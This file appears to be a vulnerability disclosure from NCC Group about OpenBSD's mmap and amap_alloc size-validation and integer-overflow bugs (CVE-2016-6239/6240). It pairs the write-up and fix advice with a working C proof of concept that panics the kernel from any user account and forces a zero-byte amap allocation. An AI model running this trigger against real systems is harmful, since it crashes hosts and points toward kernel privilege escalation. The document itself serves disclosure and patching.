/*
 * mmap_panic.c
 *    Demonstrate a panic through the mmap system call.
 *
 * gcc -g mmap_panic.c -o mmap_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
MMap can trigger an allocation panic or trigger memory corruption

Impact:
Any user on the system can use the mmap call to trigger a kernel
panic due to an over-large kernel allocation.  Users can also
trigger integer overflows which lead to undersized allocation
which later lead to kernel memory corruption. This may allow
an attacker to gain code execution in the kernel and result
in privilege escalation.

Description:
When a user provides the __MAP_NOFAULT flag to mmap, the
kernel calls amap_alloc() which calls malloc() with a size derived 
from the user-passed size. This is called through
sys_mmap(), uvm_mmapfile() and uvm_map() without ever
validating the user-provided size. This can result in a panic
in malloc.  For example when requesting a mapping of
0x222.1111.0000 bytes, amap_alloc() will compute that it needs
0x2221.1110 slots and amap_alloc1() will compute that it needs
0x2221.1200 total slots and will call malloc() to allocate
0x2.2211.2000 bytes resulting in a panic of
"panic: malloc: allocation too large, type = 98, size = 9161482240".

The amap_alloc() call is reachable whenever the UVM_FLAG_OVERLAY
flag has been selected.  This happens when mapping a file
with the __MAP_NOFAULT or when making a MAP_ANON maping.
However, the MAP_ANON cause performs validation on the size
parameter which prevents large alocations from happening in
amap_alloc().

Besides causing a panic, the amap_alloc() code can also miscalculate 
the allocation size which would cause an undersized allocation in 
amap_alloc1().  This could lead to memory corruption later.  There are 
two causes.  First amap_alloc() computes slots from a size_t size into
an integer slots variable:

struct vm_amap *
amap_alloc(vaddr_t sz, vaddr_t padsz, int waitf)
{
    struct vm_amap *amap;
    int slots, padslots;

    AMAP_B2SLOT(slots, sz);     /* load slots */
    AMAP_B2SLOT(padslots, padsz);

(Note that padslots is always zero when called from the mmap system call).
If the original size is larger 0x1000.0000.0000 or larger it will
result in a truncated value of slots, resulting in an undersized amap.
The second problem arises in amap_alloc1():

    totalslots = malloc_roundup((slots + padslots) * MALLOC_SLOT_UNIT) /
        MALLOC_SLOT_UNIT;
    amap->am_ref = 1;
    amap->am_flags = 0;
#ifdef UVM_AMAP_PPREF
    amap->am_ppref = NULL;
#endif
    amap->am_maxslot = totalslots;
    amap->am_nslot = slots;
    amap->am_nused = 0;

    amap->am_slots = malloc(totalslots * MALLOC_SLOT_UNIT, M_UVMAMAP,
        waitf);

The number of slots is rounded up so that the slot entries fill
full pages.  This rounding up happens in the integer "totalslots"
variable, and can overflow the original "slots" value.  This
can happen when requesting an allocation of size 0xfff.ffff.0000,
for example. In this case amap_alloc() computes that
0xffff.fff0 slots are needed and amap_alloc1() computes
that zero totalslots are needed, and allocates an amap of zero
bytes.  If the amap->am_slots, amap->am_bckptr or amap->am_anon
fields are later accessed, it can lead to out-of-memory
reads and writes on the kernel allocation heap.  Many accesses
through these pointers are guaraded by am_slots (the original
slots count of 0xfffffff0) and not am_maxslots (which contains the 
flawed slot count of zero). This might lead to kernel code execution 
and privilege escalation.

Reproduction:
Run the attached mmap_panic.c program. It performs a mmap
call with a large size and with the __MAP_NOFAULT flag set.
This results in a panic of 
"malloc: allocation too large, type = 98, size = 9161482240".  
(Note that 9161482240 is 0x2.2211.2000 in hex).
NCC Group was able to reproduce this issue on OpenBSD 5.9 release 
running amd64.

Run the attached mmap_panic.c program as "./mmap-panic -1"
to trigger the second test case.  This case causes a zero-byte
allocation of the amap.  It does not cause a crash, but setting
a breakpoint in amap_alloc1() will verify the short allocation.

Recommendation:
Address the allocation size issue by validating the allocation
size in sys_mmap.c in uvm/uvm_mmap.c.  Code for validating
sizes already exists for other cases, such as when creating
an anonymous mapping:

        if ((flags & MAP_ANON) != 0 ||
            ((flags & MAP_PRIVATE) != 0 && (prot & PROT_WRITE) != 0)) {
            if (size >
                (p->p_rlimit[RLIMIT_DATA].rlim_cur - ptoa(p->p_vmspace->vm_dused))) {
                return ENOMEM;
            }
        }

To address the integer truncation and overflow issues, change
the "slots" and "padslots" variables in amap_alloc() to unsigned
long values or some other suitable type.  Change the "totalslots"
type in amap_alloc1() to the same type, and detect integer
overflows when using malloc_roundup().  The resulting count
should always be larger than the original slots argument and
an error should be returned when it is not.

Reported: 2016-07-12
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/uvm/uvm_mmap.c.diff?r1=1.134&r2=1.135
          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/uvm/uvm_mmap.c.diff?r1=1.135&r2=1.136
          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/uvm/uvm_mmap.c.diff?r1=1.136&r2=1.137
          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/uvm/uvm_amap.c.diff?r1=1.74&r2=1.75
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/016_mmap.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/016_mmap.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.8/common/020_mmap.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.8/common/020_mmap.patch.sig
Assigned: CVE-2016-6239 CVE-2016-6240
#endif // BUG_WRITEUP ---------------------------------------------------


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>

void xperror(int cond, char *msg)
{
    if(cond) {
        perror(msg);
        exit(1);
    }
}

void test0()
{
    void *p;
    int fd;

    fd = open("/tmp/mapfile", O_RDWR | O_CREAT, 0666);
    xperror(fd == -1, "/tmp/mapfile");

    /* cause a crash in kernel malloc */
    printf("test0\n");
    p = mmap(0, 0x222211110000, 0, __MAP_NOFAULT, fd, 0);
    xperror(p == (void*)-1, "mmap");
}

void test1()
{
    char *p;
    size_t i;
    int fd;

    fd = open("/tmp/mapfile", O_RDWR | O_CREAT, 0666);
    xperror(fd == -1, "/tmp/mapfile");

    /* cause a bad amap allocation */
    printf("test1\n");
    p = mmap(0, 0x0fffffff0000, 0, __MAP_NOFAULT, fd, 0);
    xperror((void*)p == (void*)-1, "mmap");

    /* note: no crash is caused, the bad amap is never used... */
}

int main(int argc, char **argv)
{
    if(argc > 1 && strcmp(argv[1], "-1") == 0) 
        test1();
    else
        test0();
    printf("no crash!\n");
    return 0;
}
